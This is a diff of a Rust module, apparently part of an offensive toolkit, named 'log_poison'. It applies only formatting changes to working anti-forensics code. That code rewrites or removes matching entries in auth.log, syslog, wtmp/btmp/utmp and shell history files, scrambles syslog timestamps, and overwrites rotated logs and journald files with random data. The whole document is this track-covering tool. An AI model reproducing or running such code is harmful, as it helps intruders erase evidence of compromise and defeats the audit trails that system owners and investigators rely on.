@@ -25,31 +25,31 @@ pub enum LogpMode {
 
 #[derive(Debug, Clone)]
 pub struct LogpReplace {
-    pub needle:      String,
+    pub needle: String,
     pub replacement: String,
 }
 
 pub struct LogpOpts {
-    pub mode:            LogpMode,
-    pub replacements:    Vec<LogpReplace>,
-    pub scramble_ts:     bool,
+    pub mode: LogpMode,
+    pub replacements: Vec<LogpReplace>,
+    pub scramble_ts: bool,
     pub ts_window_start: i64,
-    pub ts_window_end:   i64,
-    pub do_auth_log:     bool,
-    pub do_syslog:       bool,
-    pub do_wtmp:         bool,
+    pub ts_window_end: i64,
+    pub do_auth_log: bool,
+    pub do_syslog: bool,
+    pub do_wtmp: bool,
     pub do_bash_history: bool,
-    pub do_journal:      bool,
-    pub extra_logs:      Vec<String>,
-    pub verbose:         bool,
+    pub do_journal: bool,
+    pub extra_logs: Vec<String>,
+    pub verbose: bool,
 }
 
 #[derive(Debug, Default)]
 pub struct LogpStats {
     pub files_processed: u64,
-    pub lines_replaced:  u64,
-    pub bytes_wiped:     u64,
-    pub errors:          u64,
+    pub lines_replaced: u64,
+    pub bytes_wiped: u64,
+    pub errors: u64,
 }
 
 // ── Destroy a file ────────────────────────────────────────────────────────────
@@ -58,12 +58,17 @@ fn destroy_file(path: &str, stats: &mut LogpStats) -> Result<()> {
     let meta = match fs::metadata(path) {
         Ok(m) => m,
         Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
-        Err(e) => { stats.errors += 1; return Err(e.to_string()); }
+        Err(e) => {
+            stats.errors += 1;
+            return Err(e.to_string());
+        }
     };
 
     let size = meta.len();
-    let mut f = OpenOptions::new().write(true).open(path)
-        .map_err(|e| { stats.errors += 1; e.to_string() })?;
+    let mut f = OpenOptions::new().write(true).open(path).map_err(|e| {
+        stats.errors += 1;
+        e.to_string()
+    })?;
 
     // Random overwrite
     if size > 0 {
@@ -72,7 +77,9 @@ fn destroy_file(path: &str, stats: &mut LogpStats) -> Result<()> {
         while written < size {
             let chunk = (size - written).min(4096) as usize;
             fill_random(&mut buf[..chunk]);
-            if f.write_all(&buf[..chunk]).is_err() { break; }
+            if f.write_all(&buf[..chunk]).is_err() {
+                break;
+            }
             written += chunk as u64;
         }
         let _ = f.flush();
@@ -83,15 +90,17 @@ fn destroy_file(path: &str, stats: &mut LogpStats) -> Result<()> {
     let _ = f.flush();
 
     stats.files_processed += 1;
-    stats.bytes_wiped     += size;
+    stats.bytes_wiped += size;
     Ok(())
 }
 
 // ── In-place string replacement (fixed-width) ─────────────────────────────────
 
-fn replace_inplace(line: &mut Vec<u8>, needle: &[u8], replacement: &[u8]) -> usize {
+fn replace_inplace(line: &mut [u8], needle: &[u8], replacement: &[u8]) -> usize {
     let nlen = needle.len();
-    if nlen == 0 { return 0; }
+    if nlen == 0 {
+        return 0;
+    }
     let mut count = 0;
     let mut i = 0;
     while i + nlen <= line.len() {
@@ -113,9 +122,13 @@ fn replace_inplace(line: &mut Vec<u8>, needle: &[u8], replacement: &[u8]) -> usi
 
 // ── Syslog timestamp scramble ─────────────────────────────────────────────────
 
-fn scramble_syslog_ts(line: &mut Vec<u8>, ts_start: i64, ts_end: i64) {
-    if line.len() < 16 { return; }
-    if !line[0].is_ascii_uppercase() { return; }
+fn scramble_syslog_ts(line: &mut [u8], ts_start: i64, ts_end: i64) {
+    if line.len() < 16 {
+        return;
+    }
+    if !line[0].is_ascii_uppercase() {
+        return;
+    }
 
     let range = (ts_end - ts_start).max(1) as u32;
     let t = ts_start + (crate::rand_u32() % range) as i64;
@@ -127,15 +140,18 @@ fn scramble_syslog_ts(line: &mut Vec<u8>, ts_start: i64, ts_end: i64) {
     };
 
     static MONTHS: [&str; 12] = [
-        "Jan","Feb","Mar","Apr","May","Jun",
-        "Jul","Aug","Sep","Oct","Nov","Dec",
+        "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
     ];
 
     let mon = tm.tm_mon as usize;
-    if mon >= 12 { return; }
+    if mon >= 12 {
+        return;
+    }
 
-    let ts = format!("{} {:2} {:02}:{:02}:{:02} ",
-        MONTHS[mon], tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+    let ts = format!(
+        "{} {:2} {:02}:{:02}:{:02} ",
+        MONTHS[mon], tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec
+    );
 
     // Exactly 16 chars — overwrite in-place
     let ts_bytes = ts.as_bytes();
@@ -154,13 +170,22 @@ pub fn logp_text_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Res
     let f = match File::open(path) {
         Ok(f) => f,
         Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
-        Err(e) => { stats.errors += 1; return Err(e.to_string()); }
+        Err(e) => {
+            stats.errors += 1;
+            return Err(e.to_string());
+        }
     };
 
     let tmp_path = format!("{}.s2tmp", path);
-    let mut out = OpenOptions::new().write(true).create(true).truncate(true)
+    let mut out = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .truncate(true)
         .open(&tmp_path)
-        .map_err(|e| { stats.errors += 1; e.to_string() })?;
+        .map_err(|e| {
+            stats.errors += 1;
+            e.to_string()
+        })?;
 
     let reader = BufReader::new(f);
     let mut line_repl = 0u64;
@@ -173,7 +198,10 @@ pub fn logp_text_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Res
         let mut hit = false;
         for rep in &opts.replacements {
             let n = replace_inplace(&mut buf, rep.needle.as_bytes(), rep.replacement.as_bytes());
-            if n > 0 { hit = true; line_repl += n as u64; }
+            if n > 0 {
+                hit = true;
+                line_repl += n as u64;
+            }
         }
 
         if hit && opts.scramble_ts && opts.ts_window_start > 0 {
@@ -185,16 +213,20 @@ pub fn logp_text_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Res
 
     // Preserve permissions
     if let Ok(meta) = fs::metadata(path) {
-        let _ = fs::set_permissions(&tmp_path,
-            fs::Permissions::from_mode(meta.permissions().mode()));
+        let _ = fs::set_permissions(
+            &tmp_path,
+            fs::Permissions::from_mode(meta.permissions().mode()),
+        );
     }
 
     drop(out);
-    fs::rename(&tmp_path, path)
-        .map_err(|e| { let _ = fs::remove_file(&tmp_path); e.to_string() })?;
+    fs::rename(&tmp_path, path).map_err(|e| {
+        let _ = fs::remove_file(&tmp_path);
+        e.to_string()
+    })?;
 
     stats.files_processed += 1;
-    stats.lines_replaced  += line_repl;
+    stats.lines_replaced += line_repl;
     Ok(())
 }
 
@@ -207,12 +239,12 @@ pub fn logp_text_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Res
 // We access fields by known offsets rather than depending on libc::utmp layout.
 
 const UTMP_RECORD_SIZE: usize = 384;
-const UTMP_OFF_USER:    usize = 44;
-const UTMP_OFF_HOST:    usize = 76;
-const UTMP_OFF_LINE:    usize = 8;
-const UTMP_FIELD_USER:  usize = 32;
-const UTMP_FIELD_HOST:  usize = 256;
-const UTMP_FIELD_LINE:  usize = 32;
+const UTMP_OFF_USER: usize = 44;
+const UTMP_OFF_HOST: usize = 76;
+const UTMP_OFF_LINE: usize = 8;
+const UTMP_FIELD_USER: usize = 32;
+const UTMP_FIELD_HOST: usize = 256;
+const UTMP_FIELD_LINE: usize = 32;
 
 fn contains_needle(field: &[u8], needle: &[u8]) -> bool {
     field.windows(needle.len()).any(|w| w == needle)
@@ -233,7 +265,10 @@ pub fn logp_wtmp_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Res
     let mut f = match OpenOptions::new().read(true).write(true).open(path) {
         Ok(f) => f,
         Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
-        Err(e) => { stats.errors += 1; return Err(e.to_string()); }
+        Err(e) => {
+            stats.errors += 1;
+            return Err(e.to_string());
+        }
     };
 
     let mut rec = [0u8; UTMP_RECORD_SIZE];
@@ -245,7 +280,10 @@ pub fn logp_wtmp_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Res
         match f.read_exact(&mut rec) {
             Ok(_) => {}
             Err(e) if e.kind() == std::io::ErrorKind::UnexpectedEof => break,
-            Err(e) => { stats.errors += 1; return Err(e.to_string()); }
+            Err(e) => {
+                stats.errors += 1;
+                return Err(e.to_string());
+            }
         }
 
         let mut hit = false;
@@ -278,7 +316,7 @@ pub fn logp_wtmp_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> Res
 
     let _ = f.flush();
     stats.files_processed += 1;
-    stats.lines_replaced  += modified;
+    stats.lines_replaced += modified;
     Ok(())
 }
 
@@ -296,7 +334,10 @@ fn process_history_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> R
     };
 
     let tmp_path = format!("{}.s2tmp", path);
-    let mut out = OpenOptions::new().write(true).create(true).truncate(true)
+    let mut out = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .truncate(true)
         .open(&tmp_path)
         .map_err(|e| e.to_string())?;
 
@@ -322,16 +363,20 @@ fn process_history_file(path: &str, opts: &LogpOpts, stats: &mut LogpStats) -> R
     }
 
     if let Ok(meta) = fs::metadata(path) {
-        let _ = fs::set_permissions(&tmp_path,
-            fs::Permissions::from_mode(meta.permissions().mode()));
+        let _ = fs::set_permissions(
+            &tmp_path,
+            fs::Permissions::from_mode(meta.permissions().mode()),
+        );
     }
 
     drop(out);
-    fs::rename(&tmp_path, path)
-        .map_err(|e| { let _ = fs::remove_file(&tmp_path); e.to_string() })?;
+    fs::rename(&tmp_path, path).map_err(|e| {
+        let _ = fs::remove_file(&tmp_path);
+        e.to_string()
+    })?;
 
     stats.files_processed += 1;
-    stats.lines_replaced  += removed;
+    stats.lines_replaced += removed;
     Ok(())
 }
 
@@ -350,7 +395,9 @@ const HISTORY_FILES: &[&str] = &[
 
 fn process_history_for_home(home: &str, opts: &LogpOpts, stats: &mut LogpStats) {
     if let Ok(hf) = std::env::var("HISTFILE") {
-        if !hf.is_empty() { let _ = process_history_file(&hf, opts, stats); }
+        if !hf.is_empty() {
+            let _ = process_history_file(&hf, opts, stats);
+        }
     }
     for name in HISTORY_FILES {
         let path = format!("{}/{}", home, name);
@@ -384,7 +431,11 @@ pub fn logp_bash_history(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
 // ── journald ──────────────────────────────────────────────────────────────────
 
 fn run_journalctl(arg: &str) -> bool {
-    Command::new("journalctl").arg(arg).output().map(|o| o.status.success()).unwrap_or(false)
+    Command::new("journalctl")
+        .arg(arg)
+        .output()
+        .map(|o| o.status.success())
+        .unwrap_or(false)
 }
 
 fn destroy_journal_files(stats: &mut LogpStats) {
@@ -398,7 +449,10 @@ fn destroy_journal_files(stats: &mut LogpStats) {
             }
         }
     }
-    eprintln!("[+] journal: {} .journal file(s) overwritten", stats.files_processed);
+    eprintln!(
+        "[+] journal: {} .journal file(s) overwritten",
+        stats.files_processed
+    );
 }
 
 pub fn logp_journal(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
@@ -423,9 +477,15 @@ pub fn log_poison(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
     }
 
     if opts.do_auth_log {
-        for p in &["/var/log/auth.log", "/var/log/secure", "/var/log/auth.log.1"] {
+        for p in &[
+            "/var/log/auth.log",
+            "/var/log/secure",
+            "/var/log/auth.log.1",
+        ] {
             if std::path::Path::new(p).exists() {
-                if opts.verbose { eprintln!("[*] {}", p); }
+                if opts.verbose {
+                    eprintln!("[*] {}", p);
+                }
                 let _ = logp_text_file(p, opts, stats);
             }
         }
@@ -433,7 +493,9 @@ pub fn log_poison(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
             for pattern in &["/var/log/auth.log.*.gz", "/var/log/secure-*.gz"] {
                 if let Ok(entries) = glob(pattern) {
                     for e in entries.flatten() {
-                        if let Some(p) = e.to_str() { let _ = destroy_file(p, stats); }
+                        if let Some(p) = e.to_str() {
+                            let _ = destroy_file(p, stats);
+                        }
                     }
                 }
             }
@@ -441,16 +503,25 @@ pub fn log_poison(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
     }
 
     if opts.do_syslog {
-        for p in &["/var/log/syslog", "/var/log/messages", "/var/log/syslog.1", "/var/log/kern.log"] {
+        for p in &[
+            "/var/log/syslog",
+            "/var/log/messages",
+            "/var/log/syslog.1",
+            "/var/log/kern.log",
+        ] {
             if std::path::Path::new(p).exists() {
-                if opts.verbose { eprintln!("[*] {}", p); }
+                if opts.verbose {
+                    eprintln!("[*] {}", p);
+                }
                 let _ = logp_text_file(p, opts, stats);
             }
         }
         if opts.mode == LogpMode::Destroy {
             if let Ok(entries) = glob("/var/log/syslog.*.gz") {
                 for e in entries.flatten() {
-                    if let Some(p) = e.to_str() { let _ = destroy_file(p, stats); }
+                    if let Some(p) = e.to_str() {
+                        let _ = destroy_file(p, stats);
+                    }
                 }
             }
         }
@@ -459,7 +530,9 @@ pub fn log_poison(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
     if opts.do_wtmp {
         for p in &["/var/log/wtmp", "/var/log/btmp", "/var/run/utmp"] {
             if std::path::Path::new(p).exists() {
-                if opts.verbose { eprintln!("[*] {}", p); }
+                if opts.verbose {
+                    eprintln!("[*] {}", p);
+                }
                 let _ = logp_wtmp_file(p, opts, stats);
             }
         }
@@ -481,12 +554,18 @@ pub fn log_poison(opts: &LogpOpts, stats: &mut LogpStats) -> Result<()> {
     }
 
     for extra in &opts.extra_logs {
-        if opts.verbose { eprintln!("[*] extra: {}", extra); }
+        if opts.verbose {
+            eprintln!("[*] extra: {}", extra);
+        }
         let _ = logp_text_file(extra, opts, stats);
     }
 
-    eprintln!("[+] log_poison: {} file(s), {} line(s), {} MiB, {} error(s)",
-        stats.files_processed, stats.lines_replaced,
-        stats.bytes_wiped >> 20, stats.errors);
+    eprintln!(
+        "[+] log_poison: {} file(s), {} line(s), {} MiB, {} error(s)",
+        stats.files_processed,
+        stats.lines_replaced,
+        stats.bytes_wiped >> 20,
+        stats.errors
+    );
     Ok(())
 }
